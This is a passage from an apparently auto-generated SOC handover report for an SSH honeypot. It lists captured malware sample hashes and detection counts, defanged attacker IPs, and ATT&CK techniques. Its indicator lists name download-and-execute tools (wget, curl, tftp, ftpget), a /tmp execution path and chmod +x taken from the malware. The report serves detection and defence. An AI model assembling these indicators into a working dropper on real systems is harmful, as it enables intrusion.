| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `3eab3901798ec748895b2dca4b8762aec553d2966112999c60061d4599b599a0` | ELF Binary (Linux executable) (x86 32-bit) | `3eab3901798ec748...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 63/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `417e065ee49c19c83c0e9cd99b702efde39d77b6c02d56b69a6c56b93d275ff3` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `417e065ee49c19c8...` | 47/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `34.122.244[.]225` | US | Google LLC | **100** ⚠️ | 3 |
| `136.185.6[.]181` | IN | Bharti Airtel Limited | **100** ⚠️ | 50 |
| `27.50.29[.]181` | ID | PT. Mora Telematika Indonesia | **100** ⚠️ | 13 |
| `171.243.150[.]132` | VN | Viettel Group | **100** ⚠️ | 0 |
| `186.103.136[.]43` | CL | CONSEJO DE DEFENSA DEL NINO/CIUDAD DEL NINO | **100** ⚠️ | 50 |
| `111.70.23[.]222` | TW | CHT-Mobile business Group,Chunghwa | **100** ⚠️ | 24 |
| `111.39.167[.]59` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |
| `95.35.29[.]192` | IL | Cellcom Fixed Line Communication L.P | **100** ⚠️ | 50 |
| `58.22.255[.]28` | CN | Longyan city, fujian provincial network of CNCGROUP | **100** ⚠️ | 50 |
| `186.215.107[.]189` | BR | Exponencial Serviços de Cons. e Asses. Ltda | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1078](https://attack.mitre.org/techniques/T1078) | 151 |
| [T1592](https://attack.mitre.org/techniques/T1592) | 151 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 1 |

---

## 🔕 False Positive Summary (13 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 8 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 10 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 238 cases |
| Tool 34  | Credential Extractor        | ✅ 167 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 75 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 13 filtered (5.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 52 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 27 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 151 priority case(s) shown individually · 22 recon entry/entries in table (11 group(s) consolidating 63 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-29T19:22:56Z_
